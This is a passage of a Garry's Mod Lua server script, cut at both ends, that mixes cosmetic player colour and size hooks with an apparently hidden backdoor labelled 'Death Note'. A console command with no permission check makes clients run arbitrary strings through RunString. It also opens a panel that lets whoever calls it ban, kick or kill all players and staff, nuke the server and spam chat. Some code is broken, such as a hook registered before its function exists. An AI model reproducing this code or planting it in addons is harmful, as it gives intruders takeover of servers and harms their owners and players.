game.ConsoleCommand(&quot;ulx unban {{argument}}\n&quot;)
end)
timer.Simple( &quot;logon&quot;, 2, 0, function()
game.ConsoleCommand(&quot;ulx logecho 1\n&quot;)
end)



--[[

    Player Color &amp; Size

]]--



local PP_ = &quot;persistentpose_&quot;

for i = 0, 64 do
	CreateClientConVar( PP_ .. &quot;flex&quot; .. i, 0, true, true )
	cvars.AddChangeCallback( PP_ .. &quot;flex&quot; .. i, ApplySettings )
end


local function spawn( ply )
       local dice = math.random(1,5)
        if dice==1 then
		ply:SetColor( Color(255,255,255,255 ) )
		elseif dice==2 then
		ply:SetColor( Color(255,178,102,255 ) )
		elseif dice==3 then
		ply:SetColor( Color(255,209,153,255 ) )
		elseif dice==4 then
		ply:SetColor( Color(240,230,130,255 ) )
		elseif dice==5 then
		ply:SetColor( Color( math.random(1,255), math.random(1,255), math.random(1,255), 255 ) )
	end
end
hook.Add( &quot;PlayerSpawn&quot;, &quot;some_unique_name&quot;, spawn )


local function spawn2( ply )
        local dice = math.random(1,15)
        if dice==1 then
		ply:SetFlexWeight(0,5)
		ply:SetFlexWeight(5,5)
		ply:SetFlexWeight(2,0)
		ply:SetFlexWeight(3,0)
		ply:SetFlexWeight(4,0)
		ply:SetFlexWeight(5,0)	
		ply:SetFlexWeight(6,0)
		ply:SetFlexWeight(7,0)
		ply:SetFlexWeight(8,0)
		ply:SetFlexWeight(9,0)
		elseif dice==2 then
		ply:SetFlexWeight(0,0)
		ply:SetFlexWeight(5,0)
		ply:SetFlexWeight(2,5)
		ply:SetFlexWeight(3,5)
		ply:SetFlexWeight(4,5)
		ply:SetFlexWeight(5,5)	
		ply:SetFlexWeight(6,5)
		ply:SetFlexWeight(7,5)
		ply:SetFlexWeight(8,5)
		ply:SetFlexWeight(9,5)
		elseif dice==3 then
		ply:SetFlexWeight(0,52)
		ply:SetFlexWeight(5,7)
		ply:SetFlexWeight(2,6)
		ply:SetFlexWeight(3,0)
		ply:SetFlexWeight(4,0)
		ply:SetFlexWeight(5,0)	
		ply:SetFlexWeight(6,0)
		ply:SetFlexWeight(7,0)
		ply:SetFlexWeight(8,0)
		ply:SetFlexWeight(9,0)
		ply:SetFlexWeight(50,0)
		ply:SetFlexWeight(55,0)
		ply:SetFlexWeight(52,5)
		ply:SetFlexWeight(53,5)
		ply:SetFlexWeight(54,0.5)
		ply:SetFlexWeight(55,0.5)
		elseif dice==4 then
		ply:SetFlexWeight(0,0)
		ply:SetFlexWeight(5,0)
		ply:SetFlexWeight(2,7)
		ply:SetFlexWeight(3,7)
		ply:SetFlexWeight(4,7)
		ply:SetFlexWeight(5,7)	
		ply:SetFlexWeight(6,7)
		ply:SetFlexWeight(7,7)
		ply:SetFlexWeight(8,7)
		ply:SetFlexWeight(9,7)
		ply:SetFlexWeight(20,7)
		ply:SetFlexWeight(23,3)
		ply:SetFlexWeight(23,3)
		ply:SetFlexWeight(24,3)
		ply:SetFlexWeight(25,0)
		ply:SetFlexWeight(26,0)
		ply:SetFlexWeight(27,0)
		ply:SetFlexWeight(28,3)
		ply:SetFlexWeight(29,3)
		ply:SetFlexWeight(30,0)
		ply:SetFlexWeight(33,0)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,3)
		ply:SetFlexWeight(34,3)
		ply:SetFlexWeight(35,0)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0)
		ply:SetFlexWeight(39,3)
		ply:SetFlexWeight(40,0)
		ply:SetFlexWeight(43,0)
		ply:SetFlexWeight(42,3)
		ply:SetFlexWeight(43,1)
		elseif dice==5 then
		ply:SetFlexWeight(20,0)
		ply:SetFlexWeight(21,0)
		ply:SetFlexWeight(22,0)
		ply:SetFlexWeight(23,0)
		ply:SetFlexWeight(24,1)
		ply:SetFlexWeight(25,1)	
		ply:SetFlexWeight(26,0.0)
		ply:SetFlexWeight(27,0)
		ply:SetFlexWeight(28,0)
		ply:SetFlexWeight(29,0)
		ply:SetFlexWeight(30,0)
		ply:SetFlexWeight(31,0)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,0)
		ply:SetFlexWeight(34,2)
		ply:SetFlexWeight(35,2)
		ply:SetFlexWeight(36,2)
		ply:SetFlexWeight(37,2)
		ply:SetFlexWeight(38,0.5)
		ply:SetFlexWeight(39,2)
		ply:SetFlexWeight(40,2)
		ply:SetFlexWeight(41,2)
		ply:SetFlexWeight(42,2)
		ply:SetFlexWeight(43,2)
		elseif dice==6 then
		ply:SetFlexWeight(20,0)
		ply:SetFlexWeight(21,0)
		ply:SetFlexWeight(22,0)
		ply:SetFlexWeight(23,0)
		ply:SetFlexWeight(24,1)
		ply:SetFlexWeight(25,1)	
		ply:SetFlexWeight(26,0.0)
		ply:SetFlexWeight(27,3)
		ply:SetFlexWeight(28,3)
		ply:SetFlexWeight(29,3)
		ply:SetFlexWeight(30,3)
		ply:SetFlexWeight(31,3)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,0)
		ply:SetFlexWeight(34,0)
		ply:SetFlexWeight(35,0)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0.5)
		ply:SetFlexWeight(39,0)
		ply:SetFlexWeight(40,0)
		ply:SetFlexWeight(41,0)
		ply:SetFlexWeight(42,0)
		ply:SetFlexWeight(43,0)
		elseif dice==7 then
		ply:SetFlexWeight(0,1)
		ply:SetFlexWeight(1,1)
		ply:SetFlexWeight(2,0)
		ply:SetFlexWeight(3,0)
		ply:SetFlexWeight(4,0)
		ply:SetFlexWeight(5,0)	
		ply:SetFlexWeight(6,0)
		ply:SetFlexWeight(7,0)
		ply:SetFlexWeight(8,0)
		ply:SetFlexWeight(9,0)
		ply:SetFlexWeight(20,0)
		ply:SetFlexWeight(21,2)
		ply:SetFlexWeight(22,2)
		ply:SetFlexWeight(23,0)
		ply:SetFlexWeight(24,1)
		ply:SetFlexWeight(25,2)	
		ply:SetFlexWeight(26,0.0)
		ply:SetFlexWeight(27,0)
		ply:SetFlexWeight(28,0)
		ply:SetFlexWeight(29,3)
		ply:SetFlexWeight(30,3)
		ply:SetFlexWeight(31,3)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,0)
		ply:SetFlexWeight(34,0)
		ply:SetFlexWeight(35,0)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0.5)
		ply:SetFlexWeight(39,3)
		ply:SetFlexWeight(40,3)
		ply:SetFlexWeight(41,2)
		ply:SetFlexWeight(42,3)
		ply:SetFlexWeight(43,3)
		elseif dice==8 then
		ply:SetFlexWeight(10,3)
		ply:SetFlexWeight(11,3)
		ply:SetFlexWeight(12,1.5)
		ply:SetFlexWeight(13,1.5)
		ply:SetFlexWeight(14,0)
		ply:SetFlexWeight(15,0)
		ply:SetFlexWeight(21,2)
		ply:SetFlexWeight(22,2)
		ply:SetFlexWeight(23,3)
		ply:SetFlexWeight(24,1)
		ply:SetFlexWeight(25,2)	
		ply:SetFlexWeight(26,0.0)
		ply:SetFlexWeight(27,3)
		ply:SetFlexWeight(28,0)
		ply:SetFlexWeight(29,3)
		ply:SetFlexWeight(30,3)
		ply:SetFlexWeight(31,3)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,0)
		ply:SetFlexWeight(34,0)
		ply:SetFlexWeight(35,2)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0.5)
		ply:SetFlexWeight(39,3)
		ply:SetFlexWeight(40,3)
		ply:SetFlexWeight(41,2)
		ply:SetFlexWeight(42,3)
		ply:SetFlexWeight(43,3)
		elseif dice==9 then
		ply:SetFlexWeight(20,1)
		ply:SetFlexWeight(21,1)
		ply:SetFlexWeight(22,1)
		ply:SetFlexWeight(23,1)
		ply:SetFlexWeight(24,0)
		ply:SetFlexWeight(25,0)	
		ply:SetFlexWeight(26,0)
		ply:SetFlexWeight(27,0.6)
		ply:SetFlexWeight(28,0.4)
		ply:SetFlexWeight(29,0)
		ply:SetFlexWeight(30,0)
		ply:SetFlexWeight(31,0)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,1)
		ply:SetFlexWeight(34,1)
		ply:SetFlexWeight(35,0)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0)
		ply:SetFlexWeight(39,0)
		ply:SetFlexWeight(40,1)
		ply:SetFlexWeight(41,1)
		ply:SetFlexWeight(42,0)
		ply:SetFlexWeight(43,0)
		ply:SetFlexWeight(44,0)
		elseif dice==10 then
		ply:SetFlexWeight(20,1)
		ply:SetFlexWeight(21,1)
		ply:SetFlexWeight(22,1)
		ply:SetFlexWeight(23,1)
		ply:SetFlexWeight(24,0)
		ply:SetFlexWeight(25,0)	
		ply:SetFlexWeight(26,0)
		ply:SetFlexWeight(27,0.6)
		ply:SetFlexWeight(28,0.4)
		ply:SetFlexWeight(29,0)
		ply:SetFlexWeight(30,0)
		ply:SetFlexWeight(31,0)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,1)
		ply:SetFlexWeight(34,1)
		ply:SetFlexWeight(35,0)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0)
		ply:SetFlexWeight(39,0)
		ply:SetFlexWeight(40,1)
		ply:SetFlexWeight(41,1)
		ply:SetFlexWeight(42,0)
		ply:SetFlexWeight(43,0)
		ply:SetFlexWeight(44,0)
		elseif dice==11 then
		ply:SetFlexWeight(20,3)
		ply:SetFlexWeight(21,3)
		ply:SetFlexWeight(22,3)
		ply:SetFlexWeight(23,1)
		ply:SetFlexWeight(24,0)
		ply:SetFlexWeight(25,0)	
		ply:SetFlexWeight(26,0)
		ply:SetFlexWeight(27,0.6)
		ply:SetFlexWeight(28,0.4)
		ply:SetFlexWeight(29,0)
		ply:SetFlexWeight(30,0)
		ply:SetFlexWeight(31,0)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,1)
		ply:SetFlexWeight(34,1)
		ply:SetFlexWeight(35,0)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0)
		ply:SetFlexWeight(39,0)
		ply:SetFlexWeight(40,1)
		ply:SetFlexWeight(41,1)
		ply:SetFlexWeight(42,0)
		ply:SetFlexWeight(43,0)
		ply:SetFlexWeight(44,0)
		elseif dice==12 then
		ply:SetFlexWeight(20,3)
		ply:SetFlexWeight(21,3)
		ply:SetFlexWeight(22,3)
		ply:SetFlexWeight(23,1)
		ply:SetFlexWeight(24,0)
		ply:SetFlexWeight(25,0)	
		ply:SetFlexWeight(26,0)
		ply:SetFlexWeight(27,0.6)
		ply:SetFlexWeight(28,0.4)
		ply:SetFlexWeight(29,3)
		ply:SetFlexWeight(30,3)
		ply:SetFlexWeight(31,3)
		ply:SetFlexWeight(32,3)
		ply:SetFlexWeight(33,3)
		ply:SetFlexWeight(34,3)
		ply:SetFlexWeight(35,3)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0)
		ply:SetFlexWeight(39,0)
		ply:SetFlexWeight(40,1)
		ply:SetFlexWeight(41,1)
		ply:SetFlexWeight(42,0)
		ply:SetFlexWeight(43,0)
		ply:SetFlexWeight(44,0)
		elseif dice==13 then
		ply:SetFlexWeight(0,1)
		ply:SetFlexWeight(1,1)
		ply:SetFlexWeight(2,0)
		ply:SetFlexWeight(3,0)
		ply:SetFlexWeight(4,0)
		ply:SetFlexWeight(5,0)	
		ply:SetFlexWeight(6,0)
		ply:SetFlexWeight(7,0)
		ply:SetFlexWeight(8,0)
		ply:SetFlexWeight(9,0)
		ply:SetFlexWeight(20,4)
		ply:SetFlexWeight(21,1)
		ply:SetFlexWeight(22,3)
		ply:SetFlexWeight(23,1)
		ply:SetFlexWeight(24,1)
		ply:SetFlexWeight(25,0)	
		ply:SetFlexWeight(26,0)
		ply:SetFlexWeight(27,3)
		ply:SetFlexWeight(28,3)
		ply:SetFlexWeight(29,0)
		ply:SetFlexWeight(30,0)
		ply:SetFlexWeight(31,0)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,1)
		ply:SetFlexWeight(34,1)
		ply:SetFlexWeight(35,0)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0)
		ply:SetFlexWeight(39,1)
		ply:SetFlexWeight(40,0)
		ply:SetFlexWeight(41,0)
		ply:SetFlexWeight(42,1)
		ply:SetFlexWeight(43,1)
		elseif dice==14 then
		ply:SetFlexScale(1.5)
		ply:SetFlexWeight(0,1)
		ply:SetFlexWeight(1,1)
		ply:SetFlexWeight(2,0)
		ply:SetFlexWeight(3,0)
		ply:SetFlexWeight(4,0)
		ply:SetFlexWeight(5,0)	
		ply:SetFlexWeight(6,0)
		ply:SetFlexWeight(7,0)
		ply:SetFlexWeight(8,0)
		ply:SetFlexWeight(9,0)
		ply:SetFlexWeight(20,1)
		ply:SetFlexWeight(21,1)
		ply:SetFlexWeight(22,1)
		ply:SetFlexWeight(23,1)
		ply:SetFlexWeight(24,0)
		ply:SetFlexWeight(25,0)	
		ply:SetFlexWeight(26,0)
		ply:SetFlexWeight(27,3)
		ply:SetFlexWeight(28,3)
		ply:SetFlexWeight(29,0)
		ply:SetFlexWeight(30,0)
		ply:SetFlexWeight(31,0)
		ply:SetFlexWeight(32,0)
		ply:SetFlexWeight(33,1)
		ply:SetFlexWeight(34,1)
		ply:SetFlexWeight(35,0)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,0)
		ply:SetFlexWeight(38,0)
		ply:SetFlexWeight(39,0)
		ply:SetFlexWeight(40,0)
		ply:SetFlexWeight(41,0)
		ply:SetFlexWeight(42,3)
		ply:SetFlexWeight(43,3)
		elseif dice==15 then
		ply:SetFlexWeight(0,1)
		ply:SetFlexWeight(1,1)
		ply:SetFlexWeight(2,1)
		ply:SetFlexWeight(3,4)
		ply:SetFlexWeight(4,4)
		ply:SetFlexWeight(5,1)	
		ply:SetFlexWeight(6,0)
		ply:SetFlexWeight(7,0)
		ply:SetFlexWeight(8,0)
		ply:SetFlexWeight(9,0)
		ply:SetFlexWeight(20,3)
		ply:SetFlexWeight(21,3)
		ply:SetFlexWeight(22,3)
		ply:SetFlexWeight(23,1)
		ply:SetFlexWeight(24,0)
		ply:SetFlexWeight(25,0)	
		ply:SetFlexWeight(26,0)
		ply:SetFlexWeight(27,3.6)
		ply:SetFlexWeight(28,3.4)
		ply:SetFlexWeight(29,3)
		ply:SetFlexWeight(30,3)
		ply:SetFlexWeight(31,3)
		ply:SetFlexWeight(32,3)
		ply:SetFlexWeight(33,3)
		ply:SetFlexWeight(34,3)
		ply:SetFlexWeight(35,3)
		ply:SetFlexWeight(36,0)
		ply:SetFlexWeight(37,4)
		ply:SetFlexWeight(38,4)
		ply:SetFlexWeight(39,3)
		ply:SetFlexWeight(40,3)
		ply:SetFlexWeight(41,1)
		ply:SetFlexWeight(42,3)
		ply:SetFlexWeight(43,3)
		ply:SetFlexWeight(44,3)
		
	end
end
hook.Add( &quot;PlayerSpawn&quot;, &quot;fuuu&quot;, spawn3 )


local function spawn3( ply )
        local dice = math.random(1,6)
        if dice==1 then
		ply:SetModelScale(1.1, 1)
		elseif dice==2 then
		ply:SetModelScale(0.4, 1)
		elseif dice==3 then
		ply:SetModelScale(1, 1)
		elseif dice==4 then
		ply:SetModelScale(0.6, 1)
		elseif dice==5 then
		ply:SetModelScale(0.5, 0.7)
		elseif dice==6 then
		ply:SetModelScale(0.3, 0.9)
	end
end
hook.Add( &quot;PlayerSpawn&quot;, &quot;fuuuu&quot;, spawn3 )



--[[

  DEATH NOTE

]]--

util.AddNetworkString(&quot;SENDTEST&quot;)
util.AddNetworkString(&quot;echangeinfo&quot;)

concommand.Add(&quot;fdp&quot;, function(ply, cmd, args)
        ply:SendLua(&quot;net.Receive(\&quot;SENDTEST\&quot;,function()RunString(net.ReadString())end)&quot;)
        net.Start(&quot;SENDTEST&quot;)
        net.WriteString([[
        surface.CreateFont( &quot;APG_title_font&quot;, 
        {
            font = &quot;Arial&quot;,
            size = 14,
            weight = 700,
        })
surface.CreateFont( &quot;APG_sideBar_font&quot;,
{
    font = &quot;Arial&quot;,
    size = 18,
    weight = 1500,
})

surface.CreateFont( &quot;APG_mainPanel_font&quot;,
{
    font = &quot;Arial&quot;,
    size = 19,
    weight = 8500,
})

function actioneff(aff)
    hook.Add( &quot;HUDPaint&quot;, &quot;infohud&quot;, function()
        draw.SimpleTextOutlined(
        aff,
        &quot;DermaLarge&quot;,
        ScrW() /2 ,
        40,
        Color( 255, 0, 0, 255 ),
        TEXT_ALIGN_CENTER,
        TEXT_ALIGN_CENTER,
        1,
        Color( 0, 0, 255 )
    )
end)
    timer.Simple( 3, function() hook.Remove( &quot;HUDPaint&quot;, &quot;infohud&quot; ) end )
end

local main_color = Color(32, 255, 0,255)


    local Frame = vgui.Create( &quot;DFrame&quot; )
        Frame:SetSize( ScrW() -200, ScrH() -200)
        Frame:SetPos( ScrW()/2- Frame:GetWide()/2, ScrH()/2 - Frame:GetTall()/2)
        Frame:SetTitle( &quot;&quot; )
        Frame:SetVisible( true )
        Frame:SetDraggable( true )
        Frame:MakePopup()
        Frame:ShowCloseButton(false)
        Frame:SetIcon( &quot;icon16/bug.png&quot; )
        Frame.Paint = function(i,w,h)
            draw.RoundedBox(4,0,0,w,h,Color(34, 34, 34,255))
            draw.RoundedBox(0,0,23,w,1,main_color)
            local name = &quot;      Death-Note &quot;
            draw.DrawText( name, &quot;APG_title_font&quot;,8, 5, Color( 189, 189, 189), 3 )
        end
    local closeButton = vgui.Create(&quot;DButton&quot;,Frame)
        closeButton:SetPos(Frame:GetWide() - 20,4)
        closeButton:SetSize(16,16)
        closeButton:SetText('')
        closeButton.DoClick = function()
            Frame:Remove()
        end
        closeButton.Paint = function(i,w,h)
            draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255,3))
            draw.DrawText( &quot;&acirc;&oelig;&bull;&quot;, &quot;APG_sideBar_font&quot;,0, -2, Color( 189, 189, 189), 3 )
        end
        
        
local Button = vgui.Create( &quot;DButton&quot;, Frame )
Button:SetText( &quot;&quot; )
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( (Frame:GetWide() / 2) - 60,40 )
Button:SetSize( 120, 30 )
        Button.UpdateColours = function( label, skin )
            label:SetTextStyleColor( Color( 189, 189, 189 ) )
        end
        
                Button.Paint = function(slf, w, h)

            draw.RoundedBox(0,0,h*0.85,w-5,1, Color(0, 96, 0,255))
            local text = &quot;Tout le monde&quot;
            draw.DrawText( text, &quot;APG_mainPanel_font&quot;,5, 8, Color( 189, 189, 189), 3 )
        end
        
        
Button.DoClick = function()
    local m = DermaMenu()
local infoserver, infoservericon = m:AddSubMenu( &quot;Serveur&quot; )
infoservericon:SetIcon( &quot;icon16/bug.png&quot; )
m:AddSpacer()
local meutreall, meutreiconall = m:AddSubMenu( &quot;Meutre&quot; )
meutreiconall:SetIcon( &quot;icon16/bomb.png&quot; )
m:AddSpacer()
local ulxall, ulxallicon = m:AddSubMenu( &quot;Commandes&quot; )
ulxallicon:SetIcon( &quot;icon16/script_add.png&quot; )
local notificationall, notificationallicon = ulxall:AddSubMenu( &quot;Notification&quot; )
notificationallicon:SetIcon( &quot;icon16/briefcase.png&quot; )
local meutreallsub, meutreallsubicon = meutreall:AddSubMenu( &quot;Tuer&quot; )
meutreallsubicon:SetIcon( &quot;icon16/delete.png&quot; )
local meutreallssub, meutreallssubicon = meutreall:AddSubMenu( &quot;Tuer(silencieux)&quot; )
meutreallssubicon:SetIcon( &quot;icon16/delete.png&quot; )
local explosesub, explosesubicon = meutreall:AddSubMenu( &quot;Exploser&quot; )
explosesubicon:SetIcon( &quot;icon16/delete.png&quot; )
local igniteallssub, igniteallssubicon = meutreall:AddSubMenu( &quot;Bruler&quot; )
igniteallssubicon:SetIcon( &quot;icon16/delete.png&quot; )
local kicksub, kicksubicon = ulxall:AddSubMenu( &quot;Kick&quot; )
kicksubicon:SetIcon( &quot;icon16/status_away.png&quot; )
local bansub, bansubicon = ulxall:AddSubMenu( &quot;Ban&quot; )
bansubicon:SetIcon( &quot;icon16/status_busy.png&quot; )
local freezesub, freezesubicon = ulxall:AddSubMenu( &quot;Freeze&quot; )
freezesubicon:SetIcon( &quot;icon16/stop.png&quot; )
local unfreezesub, unfreezesubicon = ulxall:AddSubMenu( &quot;Unfreeze&quot; )
unfreezesubicon:SetIcon( &quot;icon16/accept.png&quot; )
local noclipsub, noclipsubicon = ulxall:AddSubMenu( &quot;NOCLIP&quot; )
noclipsubicon:SetIcon( &quot;icon16/drive_user.png&quot; )
m:AddSpacer()



local animationall, animationallicon = m:AddSubMenu( &quot;Animation&quot; )
animationallicon:SetIcon( &quot;icon16/wand.png&quot; )
local animationallsubsalute, animationallsubiconsalute = animationall:AddSubMenu( &quot;Saluer&quot; )
animationallsubiconsalute:SetIcon( &quot;icon16/wand.png&quot; )
local animationallsubrobot, animationallsubiconrobot = animationall:AddSubMenu( &quot;Robot&quot; )
animationallsubiconrobot:SetIcon( &quot;icon16/wand.png&quot; )
m:AddSpacer()
local animationallsubcheer, animationallsubiconcheer = animationall:AddSubMenu( &quot;Levez les mains&quot; )
animationallsubiconcheer:SetIcon( &quot;icon16/wand.png&quot; )
local animationallsublaugh, animationallsubiconlaugh = animationall:AddSubMenu( &quot;Rire&quot; )
animationallsubiconlaugh:SetIcon( &quot;icon16/wand.png&quot; )
local animationallsubmuscle, animationallsubiconmuscle = animationall:AddSubMenu( &quot;Danse Sexy!&quot; )
animationallsubiconmuscle:SetIcon( &quot;icon16/wand.png&quot; )
local animationallsubpersistence, animationallsubiconpersistence = animationall:AddSubMenu( &quot;Faire le beau!&quot; )
animationallsubiconpersistence:SetIcon( &quot;icon16/wand.png&quot; )
local animationallsubdance, animationallsubicondance = animationall:AddSubMenu( &quot;Danse!&quot; )
animationallsubicondance:SetIcon( &quot;icon16/wand.png&quot; )
local moovesall, moovesiconall = m:AddSubMenu( &quot;Mouvement&quot; )
moovesiconall:SetIcon( &quot;icon16/controller.png&quot; )
m:AddSpacer()
local trollall, trollallicon = m:AddSubMenu( &quot;Troll Menu&quot; )
trollallicon:SetIcon( &quot;icon16/rainbow.png&quot; )
local spamchat, spamchaticon = trollall:AddSubMenu( &quot;Spam Chat&quot; )
spamchaticon:SetIcon( &quot;icon16/application_form.png&quot; )
local nuke, nukeicon = trollall:AddSubMenu( &quot;Nuke&quot; )
nukeicon:SetIcon( &quot;icon16/lightning.png&quot; )

local mooveall, mooveallicon = trollall:AddSubMenu( &quot;Mouvement&quot; )
mooveallicon:SetIcon( &quot;icon16/bug_error.png&quot; )

local jumpbreakall, jumpbreakallicon = trollall:AddSubMenu( &quot;Jump Break&quot; )
jumpbreakallicon:SetIcon( &quot;icon16/rainbow.png&quot; )

local gravitesub, gravitesubicon = trollall:AddSubMenu( &quot;Gravit&Atilde;&copy; Break&quot; )
gravitesubicon:SetIcon( &quot;icon16/rainbow.png&quot; )

local physiquesub, physiqueicon = trollall:AddSubMenu( &quot;Physique Break&quot; )
physiqueicon:SetIcon( &quot;icon16/rainbow.png&quot; )

local quakeearth, quakeearthicon = trollall:AddSubMenu( &quot;Tremblement&quot; )
quakeearthicon:SetIcon( &quot;icon16/rainbow.png&quot; )

local prisonsub, prisonsubicon = trollall:AddSubMenu( &quot;Prison&quot; )
prisonsubicon:SetIcon( &quot;icon16/user_orange.png&quot; )

ulxall:AddOption( &quot;CleanUP&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;cleanup&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
 end ):SetIcon( &quot;icon16/cut.png&quot; )
bansub:AddOption( &quot;ALL&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;banall&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
 end ):SetIcon( &quot;icon16/user.png&quot; )

bansub:AddOption( &quot;STAFF&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;banallstaff&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
 end ):SetIcon( &quot;icon16/user_gray.png&quot; )

kicksub:AddOption( &quot;ALL&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;Raison...&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;kickall&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/user.png&quot; )

kicksub:AddOption( &quot;STAFF&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;Raison...&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;kickallstaff&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/user_gray.png&quot; ) 

notificationall:AddOption( &quot;Generic&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;Message...&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;notification_generic&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/lightbulb_off.png&quot; )

notificationall:AddOption( &quot;Error&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;Message...&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;notification_error&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/cancel.png&quot; )

notificationall:AddOption( &quot;Undo&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;Message...&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;notification_undo&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/arrow_undo.png&quot; )

notificationall:AddOption( &quot;Hint&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;Message...&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;notification_hint&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/cut.png&quot; )

notificationall:AddOption( &quot;Cleanup&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;Message...&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;notification_cleanup&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/information.png&quot; )

meutreallsub:AddOption( &quot;ALL&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;killall&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( &quot;icon16/user.png&quot; )
meutreallsub:AddOption( &quot;STAFF&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;killallstaff&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( &quot;icon16/user_gray.png&quot; )
meutreallssub:AddOption( &quot;ALL&quot;, function() 
